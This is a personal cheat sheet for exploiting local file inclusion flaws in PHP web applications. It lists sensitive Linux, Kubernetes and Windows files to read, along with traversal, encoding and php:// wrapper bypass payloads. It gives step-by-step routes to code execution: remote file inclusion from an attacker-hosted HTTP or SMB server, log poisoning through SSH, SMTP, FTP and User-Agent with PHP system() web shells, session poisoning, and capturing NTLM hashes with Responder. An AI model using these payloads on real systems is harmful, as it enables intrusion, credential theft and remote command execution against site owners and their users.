-sometimes i need to know the exact number of slashes
- it is NOT limited to the PHP
- when you try to read PHP files sometimes you do not include .php
-interesting files to read





/etc/passwd
/etc/issue
/etc/mysql/my.cnf
/etc/fail2ban/fail2ban.conf
/etc/group
/etc/hosts
/etc/motd

/proc/self/environ (especially interesting APP_MODULE, if I got an access to this file I automatically can put PHP code in the User-Agent to get a code execution)
User-Agent: <?=phpinfo(); ?>
/proc/version
/proc/cmdline
/proc/mounts
/proc/net/arp
/proc/net/route
/proc/net/tcp
/proc/net/udp
/proc/self/cwd/<app.py_auth.py_util.py_index.php>
/proc/self/cmdline (this tells as what user the server is running so you can access his home directory to get ssh keys )
/proc/self/status
/proc/sched_debug (to get PID)
/proc/<PID>/cmdline
/etc/zabbix/zabbix_server.conf
/etc/apache2/sites-available/000-default.conf
/etc/nginx/sites-available/000-default.conf
/etc/mysql/my.cnf

/var/log/auth.log (SSH logs)
/var/log/vsftpd.log (SMTP logs)
/var/log/apache/access.log
/var/log/apache/error.log
/var/log/httpd/error_log
/usr/local/apache/log/error_log
/usr/local/apache2/log/error_log
/var/log/nginx/access.log
/var/log/nginx/error.log
/var/log/vsftpd.log
/var/log/sshd.log
/var/log/mail
/var/log/apache/access.log
/var/log/apache/error.log
/var/log/httpd/error_log
/usr/local/apache/log/error_log
/usr/local/apache2/log/error_log
/var/log/nginx/access.log
/var/log/nginx/error.log
/var/log/vsftpd.log
/var/log/sshd.log
/var/log/mail



/run/secrets/kubernetes.io/serviceaccount/token
/run/secrets/kubernetes.io/serviceaccount/namespace
/run/secrets/kubernetes.io/serviceaccount/certificate
/var/run/secrets/kubernetes.io/serviceaccount
/var/lib/mlocate/mlocate.db
/var/lib/mlocate.db



C:/Windows/System32/license.rtf
c:/boot.ini
c:/inetpub/logs/logfiles
c:/inetpub/wwwroot/global.asa
c:/inetpub/wwwroot/index.asp
c:/inetpub/wwwroot/web.config
c:/sysprep.inf
c:/sysprep.xml
c:/sysprep/sysprep.inf
c:/sysprep/sysprep.xml
c:/system32/inetsrv/metabase.xml
c:/sysprep.inf
c:/sysprep.xml
c:/sysprep/sysprep.inf
c:/sysprep/sysprep.xml
c:/system volume information/wpsettings.dat
c:/system32/inetsrv/metabase.xml
c:/unattend.txt
c:/unattend.xml
c:/unattended.txt
c:/unattended.xml
c:/windows/repair/sam
c:/windows/repair/system


Read  local files

(basic)
Param=/etc/passwd
Param=../../../../../etc/passwd
Param=..;/..;/..;/etc/passwd
Param=….//....//....//....//....///etc/passwd



(base64 wrapper)
Param=Php://filter/convert.base64-encode/resource=/etc/passwd

(ROT13 wrapper)
page=php://filter/read=string.rot13/resource=index.php

(Iconv wrapper)
page=php://filter/convert.iconv.utf-8.utf-16/resource=index.php


(unicode encoding)
param=..%ef%bc%8f..%ef%bc%8fetc/passwd

(double url encoding)
param=<double_URL_Encode>/etc/passwd

(UTF-8 encoding)
param=%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/etc/passwd

(Path and dot)
page=../../../etc/passwd............ 
page=../../../etc/passwd\.\.\.\.\.\. 
page=../../../etc/passwd/./././././.  


I can go from LFI to RFI 
 
If the underlying system is Linux

#on my terminal
Python –m SimpleHTTPServer

                       And then

param=http://<my_ip>:8000/shell_one_liner.php&cmd=<command>


If the underlying system is Windows

#on my terminal

python impacket/smbserver.py salmonella $(pwd) -smb2support

                  And then

param=\\<my_ip>\simonella\shell_one_liner.php&cmd=<command>



Trigger a malicious shell file that was uploaded to the ftp/smb/web directory by the regular file upload functionality even if the file is with an extension .jpg

upload file shell.jpg

param=<upload_directory>/shell.jpg

 get access to the logs ,poison them via SSH/FTP/SMTP/User-Agent and get a code execution

SSH (When I got an access to the SSH logs /var/log/auth.log)
Ssh ‘<?php system($_GET[‘cmd’])’@<victim_ip>

                                                         And then

Param=<logs>&cmd=<command>


SMTP (when I got an access to the SMTP logs, /var/log/<user>)
Nc <victim_ip> 25
mail from: simon@gmail.com
rcpt to: vicitm@localhost
Data
<?php system($_GET[‘cmd’])?>
.                                                 
                                                      Param

Param=<logs>&cmd=<command>

User agent (When I got an access to the Web server logs)

User Agent: <?php system($_GET[‘cmd’])?>

                                                     And then

param<logs>&cmd=<command>
                    

FTP (When I got an access to the FTP logs /var/log/vsftpd.log)
Ftp <victim_ip>
Username: <?php system($_GET[‘cmd’]);?>
Password: anonymous

Param=<logs>&cmd=<command>

get a code execution

(data wrapper)
param=data://text/plain;base64,<base64_encoded_paylaod>

(expect wrapper)
param=expect://ls

(input wrapper)

curl -X POST --data "<?php echo shell_exec('id'); ?>" "https://example.com/index.php?page=php://input%00" -k -v

(chain generator)

python chain.py –chain ‘<?php system(“whoami”)?>’ 


and you will get a big blob of text, copy it and paster into the vulnerable parameter

Session poisoning to get a code execution( requires: Windows as the underlying system and registration functionality) 

Register the following user

Username: <?=`whoami`?>   #backtick
Password: pass123

Go to the login page and login using the above credentials

Copy your own cookies - PHPSESSID

Go to the  parameter
param=C:\Windows\Temp\sess_<PHPSESSID>

And if vulnerable - results of the command should be visible
 
Steal NTLM hash (requires: windows as the underlying system)

#on my terminal 
Responder –I <interface> -vv

                       And then

Param=\\<my_ip>\simonella

And if vulnerable – I will get a NTLM hash
